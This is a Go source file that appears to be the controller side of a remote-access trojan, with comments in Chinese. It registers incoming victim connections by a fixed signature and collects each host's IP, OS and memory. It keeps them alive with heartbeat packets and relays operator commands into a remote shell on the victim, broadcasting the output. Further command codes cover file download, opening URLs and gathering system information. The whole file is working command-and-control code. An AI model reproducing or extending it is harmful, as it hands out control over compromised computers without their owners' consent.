package main

import (
	"fmt"
	"github.com/axgle/mahonia"
	"github.com/fananchong/cstruct-go"
	uuid "github.com/satori/go.uuid"
	"net"
	"strings"
	"time"
	"unsafe"
)

const SERVER_HEARTS = 0
const SERVER_RESET = 1
const SERVER_SHELL = 2
const SERVER_SHELL_CHANNEL = 3
const SERVER_DOWNLOAD = 4
const SERVER_OPENURL = 8
const SERVER_SYSTEMINFO = 10
const SERVER_SHELL_ERROR = 12

type CMSG struct {
	sign  [10]byte
	mod   uint8
	msg_l uint8
}

func listen(port string) {
	defer func() {
		tcpConn = false // TCP功能下线了
	}()
	fmt.Println("Starting the server ...")
	// 创建 listener
	listener, err := net.Listen("tcp", port)
	if err != nil {
		fmt.Println("Error listening", err.Error())
		return //终止程序
	}
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Error accepting", err.Error())
			return // 终止程序
		}
		go doServerStuff(conn)
		tcpConn = true
	}
}

// 心跳包线程池和解决首次接入
func doServerStuff(conn net.Conn) {
	defer func() {
		fmt.Println(conn.RemoteAddr().String(),"awsl!")
	}()
	for {

		if _, ok := serverMap[conn]; !ok {
			//第一次上线
			buf := make([]byte, unsafe.Sizeof(CMSG{}))
			l, err := conn.Read(buf)
			if err != nil {
				fmt.Println("Error reading Code:", l, err.Error())
				return
			}
			var msg = *(**CMSG)(unsafe.Pointer(&buf))
			fmt.Printf("Recv:\n\tMSG: %s \n\tMOD: %d \n\tLONG: %d \n", msg.sign, msg.mod, msg.msg_l)
			if string(msg.sign[:]) == "customize\x00" {
				if msg.msg_l != 0 && msg.mod == SERVER_SYSTEMINFO { // 是第一次登陆带有系统信息的包
					buf := make([]byte, msg.msg_l)
					l, err := conn.Read(buf)
					if err != nil {
						fmt.Println("Error reading in inline read:", l, err.Error())
						_ = conn.Close() // 第一次接收就GG了，完全没必要再鸟他了
						return
					}

					sp := strings.Split(string(buf[:]), "\n")
					fmt.Println("len:", len(sp), string(buf[:]))
					u1, _ := uuid.NewV4()
					if len(sp) == 4 {
						newS := S{
							uuid:        u1.String(),
							memory:      sp[2],
							OS:          sp[1],
							ip:          sp[0],
							intIp:       conn.RemoteAddr().String()[:strings.Index(conn.RemoteAddr().String(), ":")],
							status:      SERVER_HEARTS,
							shellInChan: make(chan string),
						}
						serverMap[conn] = &newS
						fmt.Println(sp[0], sp[1], sp[2])

					} else {
						newS := S{
							uuid:        u1.String(),
							memory:      "unknown",
							OS:          "unknown",
							ip:          "unknown",
							intIp:       conn.RemoteAddr().String()[:strings.Index(conn.RemoteAddr().String(), ":")],
							status:      SERVER_HEARTS,
							shellInChan: make(chan string),
						}
						serverMap[conn] = &newS
					}
					onlineMsg := fmt.Sprintf("add|%s|%s|%s|%s|%s", serverMap[conn].uuid, serverMap[conn].intIp, serverMap[conn].ip, serverMap[conn].memory, serverMap[conn].OS)
					Broadcast(onlineMsg)

				}
				Handle(conn, SERVER_HEARTS)
			}

		} else {
			s := serverMap[conn]
			if s.status == SERVER_HEARTS {
				buf := make([]byte, unsafe.Sizeof(CMSG{}))
				l, err := conn.Read(buf)
				if err != nil {
					fmt.Println("Error reading Code:", l, err.Error())
					_ = conn.Close()
					offlineMsg := fmt.Sprintf("remove|%s|%s", serverMap[conn].uuid, serverMap[conn].intIp)
					Broadcast(offlineMsg)
					delete(serverMap, conn) //因为这个不是第一次，所以conn肯定会在表里，得删除

					return
				}
				var msg = *(**CMSG)(unsafe.Pointer(&buf))
				switch msg.mod {
				case SERVER_HEARTS:

					Handle(conn, SERVER_HEARTS) // 十秒一次心跳包
					time.Sleep(10 * time.Second)
				}

			} else {
				time.Sleep(10 * time.Second)
			}
		}

	}
}

func tlLoadMsg(code int, l int) CMSG {
	var lSign [10]byte
	bSign := []byte(sign)
	for i := 0; i < 10; i++ {
		if i >= len(bSign) {
			lSign[i] = byte(0)
		} else {
			lSign[i] = bSign[i]
		}

	}
	msg := CMSG{
		sign:  lSign,
		mod:   uint8(code),
		msg_l: uint8(l),
	}
	return msg
}
func tlShellHandle(conn net.Conn) {
	s := serverMap[conn]
	go func() {
		for {
			buf := make([]byte, unsafe.Sizeof(CMSG{}))
			l, err := conn.Read(buf)
			fmt.Println(buf[:], string(buf))
			var h = *(**CMSG)(unsafe.Pointer(&buf))
			if err != nil || l == 0 {
				s.status = SERVER_HEARTS
				return
			}
			switch h.mod {
			case SERVER_SHELL_CHANNEL:
				shell := make([]byte, h.msg_l)
				l, err := conn.Read(shell)
				if err != nil || l == 0 {
					s.status = SERVER_HEARTS
					return
				}
				msg := fmt.Sprintf("out|%s|%s", s.uuid, shell)
				dec := mahonia.NewDecoder("GBK")
				Broadcast(dec.ConvertString(msg))
			case SERVER_SHELL_ERROR:
				s.status = SERVER_HEARTS
				Handle(conn,SERVER_HEARTS)
				return
			case SERVER_RESET:
				s.status = SERVER_HEARTS
				Handle(conn,SERVER_HEARTS)
				return
			}
		}
	}()
	for {
		if s.status != SERVER_SHELL {

			return
		}
		shell, _ := <-s.shellInChan
		if shell == "reset\n" {
			msg := tlLoadMsg(SERVER_RESET, 0)
			bMsg, _ := cstruct.Marshal(&msg)
			l, err := conn.Write(bMsg)
			if err != nil || l == 0 {
				fmt.Println("Send Head Error", err.Error())
				s.status = SERVER_HEARTS
				return
			}
			fmt.Println("Shell Handle exit.")
			return
		}
		msg := tlLoadMsg(SERVER_SHELL_CHANNEL, len(shell))
		bMsg, _ := cstruct.Marshal(&msg)
		l, err := conn.Write(bMsg)
		if err != nil || l == 0 {
			fmt.Println("Send Head Error", err.Error())
			s.status = SERVER_HEARTS
			return
		}
		l, err = conn.Write([]byte(shell))
		fmt.Println("send:", shell)
		if err != nil || l == 0 {
			fmt.Println("Send Error", err.Error())
			s.status = SERVER_HEARTS
			return
		}

	}

}

// 主动接管
func Handle(conn net.Conn, code int) {
	switch code {
	case SERVER_HEARTS:
		s := serverMap[conn]
		s.status = SERVER_HEARTS
		msg := tlLoadMsg(SERVER_HEARTS, 0)
		bMsg, _ := cstruct.Marshal(&msg)
		l, err := conn.Write(bMsg)
		if err != nil {
			// do something
			return
		}
		fmt.Println("Hearts Data Len:", l)
		return
	case SERVER_SHELL:
		s := serverMap[conn]
		s.status = SERVER_SHELL
		msg := tlLoadMsg(SERVER_SHELL, 0)
		bMsg, _ := cstruct.Marshal(&msg)
		l, err := conn.Write(bMsg)
		if err != nil || l == 0 {
			// do something
			s.status = SERVER_HEARTS
			return
		}
		go tlShellHandle(conn)
		//go func() {
		//	for{
		//		inputReader := bufio.NewReader(os.Stdin)
		//		input, _ := inputReader.ReadString('\n')
		//		//msg := tlLoadMsg(SERVER_SHELL_CHANNEL,len(input))
		//		//bMsg, _ := cstruct.Marshal(&msg)
		//		s.shellInChan<-input
		//	}
		//}()

	}
}
